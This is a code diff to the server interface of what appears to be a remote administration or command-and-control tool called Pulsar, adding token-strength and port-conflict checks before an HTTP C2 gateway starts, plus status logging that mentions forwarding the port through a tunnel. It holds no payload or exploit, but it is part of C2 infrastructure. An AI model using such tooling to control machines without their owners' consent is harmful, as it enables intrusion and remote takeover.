@@ -279,21 +279,62 @@ namespace Pulsar.Server.Forms
         {
             try
             {
-                if (Settings.HttpC2Enabled)
+                var tcpPorts = new List<ushort> { Settings.ListenPort };
+                if (Settings.ListenPorts != null)
                 {
-                    _httpC2Gateway ??= new HttpC2Gateway(ListenServer, Settings.HttpC2Port);
-                    _httpC2Gateway.Start();
+                    tcpPorts.AddRange(Settings.ListenPorts);
                 }
 
-                var allPorts = new List<ushort> { Settings.ListenPort };
-                if (Settings.ListenPorts != null)
-                    allPorts.AddRange(Settings.ListenPorts);
-                allPorts = allPorts.Distinct().ToList();
+                if (Settings.HttpC2Enabled)
+                {
+                    if (!Settings.IsHttpC2TokenStrong(Settings.HttpC2Token))
+                    {
+                        MessageBox.Show(
+                            this,
+                            "HTTP C2 token must be at least 32 characters and use safe characters before enabling HTTP C2.",
+                            "HTTP C2 Token Required",
+                            MessageBoxButtons.OK,
+                            MessageBoxIcon.Error);
+
+                        EventLog("HTTP C2 was not started because the configured token is missing or too weak.", "warning");
+                        return;
+                    }
+
+                    if (tcpPorts.Contains(Settings.HttpC2Port))
+                    {
+                        MessageBox.Show(
+                            this,
+                            "HTTP C2 port must be different from all TCP listener ports. Configure a dedicated HTTP C2 port before starting.",
+                            "HTTP C2 Port Conflict",
+                            MessageBoxButtons.OK,
+                            MessageBoxIcon.Error);
+
+                        EventLog($"HTTP C2 was not started because port {Settings.HttpC2Port} overlaps with TCP listener ports.", "warning");
+                        return;
+                    }
+
+                    _httpC2Gateway ??= new HttpC2Gateway(
+                        ListenServer,
+                        Settings.HttpC2Paths,
+                        Settings.HttpC2Token,
+                        Settings.HttpC2Port);
+                    _httpC2Gateway.Start();
+                    EventLog($"HTTP C2: listening on http://127.0.0.1:{Settings.HttpC2Port}/ (forward this port via your tunnel)", "info");
+                }
+
+                var allPorts = tcpPorts.Distinct().ToList();
 
                 if (allPorts.Count > 1)
+                {
                     ListenServer.ListenMany(allPorts, Settings.IPv6Support, Settings.UseUPnP);
+                }
                 else
+                {
                     ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support, Settings.UseUPnP);
+                }
+
+                var tcpPortDisplay = string.Join(", ", allPorts.Select(p => p.ToString()));
+                EventLog($"TCP C2: listening on ports {tcpPortDisplay}", "info");
             }
             catch (SocketException ex)
             {
@@ -735,6 +776,14 @@ namespace Pulsar.Server.Forms
                     else
                     {
                         statusText = "Not listening.";
+                    }
+
+                    if (Settings.HttpC2Enabled)
+                    {
+                        var httpStatus = (_httpC2Gateway != null && _httpC2Gateway.IsListening)
+                            ? $"HTTP C2: 127.0.0.1:{_httpC2Gateway.Port}"
+                            : "HTTP C2: disabled";
+                        statusText = string.IsNullOrEmpty(statusText) ? httpStatus : $"{statusText} | {httpStatus}";
                     }
 
                     listenToolStripStatusLabel.Text = statusText;
